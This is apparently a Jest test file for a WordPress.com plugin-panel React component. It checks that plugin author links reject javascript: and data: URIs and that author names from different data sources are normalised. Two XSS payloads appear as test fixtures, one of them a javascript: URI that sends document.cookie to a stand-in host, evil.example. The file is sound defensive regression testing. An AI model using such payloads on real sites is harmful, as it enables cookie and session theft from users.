/**
 * @jest-environment jsdom
 */

import { screen, waitFor } from '@testing-library/react';
import nock from 'nock';
import { render } from '../../../../test-utils';
import { PluginSites } from '../plugin-sites';

type PluginEntry = {
	slug: string;
	name: string;
	author: string;
	author_url?: string;
	active: boolean;
	id: string;
	plugin_url: string;
	version: string;
	description: string;
	network: boolean;
	update: null;
	[ key: string ]: unknown;
};

type PluginsResponse = { sites: Record< string, PluginEntry[] > };

/**
 * Minimal PluginItem-shaped object for use in API response payloads.
 * The plugin is "installed" on site 1, which drives data through the real
 * pluginsQuery → usePlugin code path.
 */
function makePluginsResponse( overrides: Record< string, unknown > = {} ): PluginsResponse {
	return {
		sites: {
			'1': [
				{
					slug: 'test-plugin',
					name: 'Test Plugin',
					author: 'Malicious Author',
					author_url: 'https://example.com',
					active: true,
					id: 'test-plugin/test-plugin.php',
					plugin_url: 'https://example.com',
					version: '1.0.0',
					description: 'A test plugin.',
					network: false,
					update: null,
					...overrides,
				},
			],
		},
	};
}

/**
 * Register nock interceptors for all API endpoints that usePlugin depends on.
 * Each test calls this with a custom pluginsResponse so that author_url data
 * flows through the real network boundary rather than a module mock.
 */
function mockApiEndpoints( pluginsResponse: PluginsResponse ) {
	// pluginsQuery() → GET /rest/v1.1/me/sites/plugins
	nock( 'https://public-api.wordpress.com' )
		.get( '/rest/v1.1/me/sites/plugins' )
		.query( true )
		.reply( 200, pluginsResponse );

	// sitesQuery() → GET /rest/v1.2/me/sites
	nock( 'https://public-api.wordpress.com' )
		.get( '/rest/v1.2/me/sites' )
		.query( true )
		.reply( 200, { sites: [] } );

	// marketplacePluginsQuery() → GET /wpcom/v2/marketplace/products
	nock( 'https://public-api.wordpress.com' )
		.get( '/wpcom/v2/marketplace/products' )
		.query( true )
		.reply( 200, { results: {} } );

	// wpOrgPluginQuery() → GET https://api.wordpress.org/plugins/info/1.2/
	// (fires because there is no marketplace icon; return empty so the hook
	//  falls back to the data already provided by pluginsQuery above)
	nock( 'https://api.wordpress.org' ).get( '/plugins/info/1.2/' ).query( true ).reply( 200, {} );
}

// ---------------------------------------------------------------------------
// Security regression tests – CVE: javascript: XSS via author_url
// ---------------------------------------------------------------------------

describe( '<PluginSites> – author link XSS regression', () => {
	/**
	 * When a plugin's author_url contains a javascript: URI the rendered
	 * anchor must NOT carry that URI as its href.
	 */
	test( 'does not render a javascript: href for the author link', async () => {
		const maliciousUrl = "javascript:fetch('https://evil.example/?c='+document.cookie)"; // eslint-disable-line no-script-url
		mockApiEndpoints( makePluginsResponse( { author_url: maliciousUrl } ) );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		// The author name must be visible so we know the description rendered.
		await waitFor( () => expect( screen.getByText( /Malicious Author/i ) ).toBeVisible() );

		// No anchor on the page may carry the javascript: URI as its href.
		const links = document.querySelectorAll( 'a[href]' );
		const unsafeLinks = Array.from( links ).filter( ( a ) =>
			( a as HTMLAnchorElement ).href.startsWith( 'javascript:' )
		);

		expect( unsafeLinks ).toHaveLength( 0 );
	} );

	/**
	 * Complementary safety check: a legitimate https: author_url must still
	 * produce a real, clickable link (so the fix doesn't break normal usage).
	 */
	test( 'renders a clickable link when author_url uses a safe https: scheme', async () => {
		mockApiEndpoints( makePluginsResponse( { author_url: 'https://trusted-author.example.com' } ) );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		const authorLink = await screen.findByRole( 'link', { name: /Malicious Author/i } );
		expect( authorLink ).toBeVisible();
		expect( ( authorLink as HTMLAnchorElement ).href ).toBe(
			'https://trusted-author.example.com/'
		);
	} );

	/**
	 * When neither author_url nor plugin_url is available the component must
	 * not render any author link at all – just the plain author name as text.
	 */
	test( 'renders plain author text when no author URL is available', async () => {
		// Remove author_url and blank out plugin_url so there is nothing to link to.
		const { author_url: _removed, ...pluginWithoutUrl } = makePluginsResponse().sites[ '1' ][ 0 ];
		mockApiEndpoints( {
			sites: {
				'1': [ { ...pluginWithoutUrl, plugin_url: '' } as PluginEntry ],
			},
		} );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		await waitFor( () => expect( screen.getByText( /Malicious Author/i ) ).toBeVisible() );
		expect( screen.queryByRole( 'link', { name: /Malicious Author/i } ) ).not.toBeInTheDocument();
	} );

	/**
	 * Some installed plugins leave author_url empty but expose the plugin's own
	 * site in plugin_url; the author link should fall back to that.
	 */
	test( 'falls back to plugin_url when author_url is missing', async () => {
		const { author_url: _removed, ...pluginWithoutAuthorUrl } =
			makePluginsResponse().sites[ '1' ][ 0 ];
		mockApiEndpoints( {
			sites: {
				'1': [
					{
						...pluginWithoutAuthorUrl,
						plugin_url: 'https://plugin-home.example.com',
					} as PluginEntry,
				],
			},
		} );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		const authorLink = await screen.findByRole( 'link', { name: /Malicious Author/i } );
		expect( ( authorLink as HTMLAnchorElement ).href ).toBe( 'https://plugin-home.example.com/' );
	} );

	/**
	 * A data: URI must also be rejected because it can carry executable
	 * payloads (e.g. data:text/html,<script>…</script>).
	 */
	test( 'does not render a data: href for the author link', async () => {
		const dataUrl = 'data:text/html,<script>alert(1)</script>';
		mockApiEndpoints( makePluginsResponse( { author_url: dataUrl } ) );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		await waitFor( () => expect( screen.getByText( /Malicious Author/i ) ).toBeVisible() );

		const links = document.querySelectorAll( 'a[href]' );
		const unsafeLinks = Array.from( links ).filter( ( a ) => {
			const href = ( a as HTMLAnchorElement ).getAttribute( 'href' ) ?? '';
			return href.toLowerCase().startsWith( 'data:' );
		} );

		expect( unsafeLinks ).toHaveLength( 0 );
	} );
} );

// ---------------------------------------------------------------------------
// Author normalization across data sources
// ---------------------------------------------------------------------------

describe( '<PluginSites> – author normalization across sources', () => {
	afterEach( () => nock.cleanAll() );

	/**
	 * No installed plugins, so usePlugin resolves the plugin from the catalog
	 * (marketplace or wp.org) instead of the WordPress.com installed data.
	 */
	function mockCatalogEndpoints( {
		marketplace = { results: {} },
		wpOrg = {},
	}: {
		marketplace?: { results: Record< string, unknown > };
		wpOrg?: Record< string, unknown >;
	} ) {
		nock( 'https://public-api.wordpress.com' )
			.get( '/rest/v1.1/me/sites/plugins' )
			.query( true )
			.reply( 200, { sites: {} } );
		nock( 'https://public-api.wordpress.com' )
			.get( '/rest/v1.2/me/sites' )
			.query( true )
			.reply( 200, { sites: [] } );
		nock( 'https://public-api.wordpress.com' )
			.get( '/wpcom/v2/marketplace/products' )
			.query( true )
			.reply( 200, marketplace );
		nock( 'https://api.wordpress.org' )
			.get( '/plugins/info/1.2/' )
			.query( true )
			.reply( 200, wpOrg );
	}

	/**
	 * Catalog sources ship `author` as an HTML anchor and the URL in
	 * `author_profile`. The panel must show the plain name with a link to the
	 * profile, never raw markup.
	 */
	test( 'strips the HTML anchor from a catalog author and links to author_profile', async () => {
		mockCatalogEndpoints( {
			marketplace: {
				results: {
					'test-plugin': {
						name: 'Test Plugin',
						slug: 'test-plugin',
						author: '<a href="https://acme.example.com/team/">Acme</a>',
						author_profile: 'https://acme.example.com/team/',
						icons: '',
					},
				},
			},
		} );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		const authorLink = await screen.findByRole( 'link', { name: /Acme/ } );
		expect( ( authorLink as HTMLAnchorElement ).href ).toBe( 'https://acme.example.com/team/' );
	} );

	/**
	 * Marketplace also ships `author` as an HTML anchor, but `author_profile` is
	 * frequently null — the panel must then show the plain name with no link
	 * (and never the placeholder `href="#"`).
	 */
	test( 'strips the HTML anchor from a marketplace author and renders plain text when author_profile is null', async () => {
		mockCatalogEndpoints( {
			marketplace: {
				results: {
					'test-plugin': {
						name: 'Test Plugin',
						slug: 'test-plugin',
						author: '<a href="#">Acme</a>',
						author_profile: null,
						icons: '',
					},
				},
			},
		} );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		await waitFor( () => expect( screen.getByText( 'By Acme' ) ).toBeVisible() );
		expect( screen.queryByRole( 'link', { name: /Acme/ } ) ).not.toBeInTheDocument();
	} );
} );
